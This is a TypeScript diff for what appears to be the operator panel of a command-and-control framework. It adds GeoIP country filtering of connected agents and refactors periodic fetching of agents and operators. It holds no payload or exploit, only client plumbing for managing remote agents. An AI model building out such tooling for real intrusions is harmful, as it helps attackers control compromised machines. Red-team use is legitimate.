@@ -31,6 +31,11 @@ export type Message = {
     createdAt: number
 }
 
+export type Country = {
+    i: string // ISO code
+    n: string // Country Name
+}
+
 export const API = ref(new class {
     public username: string
     public c2HostURL: string
@@ -44,16 +49,20 @@ export const API = ref(new class {
         this.privateKey = null
         this.store = ref({
             operators: {
-                data:[] as Operator[],
+                data: [] as Operator[],
                 page: 0,
             },
             agents: {
-                data:[] as Agent[],
+                data: [] as Agent[],
                 page: 0,
+            },
+            origins: {
+                data: [] as Country[],
+                selected: [] as string[], // ISO Country Codes.
             },
             messages: {
                 newMessageCallback: () => {},
-                data:[] as Message[],
+                data: [] as Message[],
                 agentId: '',
                 lastSentAt: 0,
                 page: undefined as number | undefined,
@@ -65,20 +74,24 @@ export const API = ref(new class {
         this.initializePeriodicDataFetching()
     }
 
-    private initializePeriodicDataFetching = async () => {
-        const generalUpdate = async () => {
-            if (this.privateKey === null || this.c2HostURL.length === 0 || this.username.length === 0) {
-                return
-            }
-
-            this.store.value.agents.data = await this.fetchAgents(this.store.value.agents.page)
-            this.store.value.operators.data = await this.fetchOperators(this.store.value.operators.page)
+    public generalUpdate = async () => {
+        if (this.privateKey === null || this.c2HostURL.length === 0 || this.username.length === 0) {
+            return
         }
 
-        await generalUpdate()
+        this.store.value.agents.data = await this.fetchAgents(this.store.value.agents.page)
+        this.store.value.operators.data = await this.fetchOperators(this.store.value.operators.page)
+
+        if (this.store.value.origins.data.length === 0) {
+            this.store.value.origins.data = await this.fetchOrigins()
+        }
+    }
+
+    private initializePeriodicDataFetching = async () => {
+        await this.generalUpdate()
 
         setInterval(async () => {
-            await generalUpdate()
+            await this.generalUpdate()
         }, 3000)
     }
 
@@ -215,8 +228,12 @@ export const API = ref(new class {
             u: this.username,
         }
 
+        const origins = this.store.value.origins.selected.length === 0
+            ? ''
+            : `&origins=${this.store.value.origins.selected.join(',')}`
+
         const token = await this.sign(tokenPayload)
-        const response = await fetch(`${this.c2HostURL}/v1/agents?page=${page}`, {
+        const response = await fetch(`${this.c2HostURL}/v1/agents?page=${page}${origins}`, {
             headers: {
                 Authorization: token,
             }
@@ -246,5 +263,24 @@ export const API = ref(new class {
         }
 
         return await response.json() as Operator[]
+    }
+
+    private fetchOrigins = async () => {
+        const tokenPayload: JWTPayload = {
+            u: this.username,
+        }
+
+        const token = await this.sign(tokenPayload)
+        const response = await fetch(`${this.c2HostURL}/v1/geoip/origins`, {
+            headers: {
+                Authorization: token,
+            }
+        })
+
+        if (response.status === 204) {
+            return []
+        }
+
+        return await response.json() as Country[]
     }
 }())
